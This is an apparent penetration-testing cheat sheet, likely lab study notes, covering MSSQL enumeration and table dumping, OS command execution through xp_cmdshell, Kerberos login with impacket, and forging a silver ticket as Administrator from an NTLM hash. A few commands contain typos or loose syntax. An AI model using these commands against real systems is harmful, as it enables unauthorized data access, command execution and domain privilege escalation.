# MSSQL
Get databases:
```
select name from sys.databases;
```
Get tables from the given database:
```
select TABLE_NAME from <DB-name>.INFORMATION_SCHEMA.TABLES;
```
Dump data from the table
```
select * from <db-name>..<table-name>;
```
```
select * from <db-name>.dbo.<table-name>;
```




# `sqsh`

# Command Injection
```
xp_cmdshell "whoami"
go
```
If it doesn't work
```
enable xp_cmdshell
```

## Authenticate with Kerberos
- (Include Kerberos TGT - it is explained in `Active Directory.md`)
- Create TGT
```
impacket-gettgt domain.local/username:password
```
- Export TGT
```
export KRB5CCNAME=outputfilename.cache
```
- Verify it
```
klist
```
- Login MS SQL service
```
impacket-mssqlclient dc01.domain.local -k
```

## Creating Silver Ticket for Authentication
- Get user SID for gaining Domain SID
- You can get it via ldap (check ippsec Scrambled 21:00)
```
impacket-getpac adminsitrator domain.local/username:password
```
- Create ticket
```
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash <lowercase-ntlm-hash> -domain-sid <S-1-5-...> -domain scrm.local
```
- `500`: Administrator ID


- Add ticket
```
export KRB5CCNAME=Administrator.ccache
```
- Verify
```
klist
```
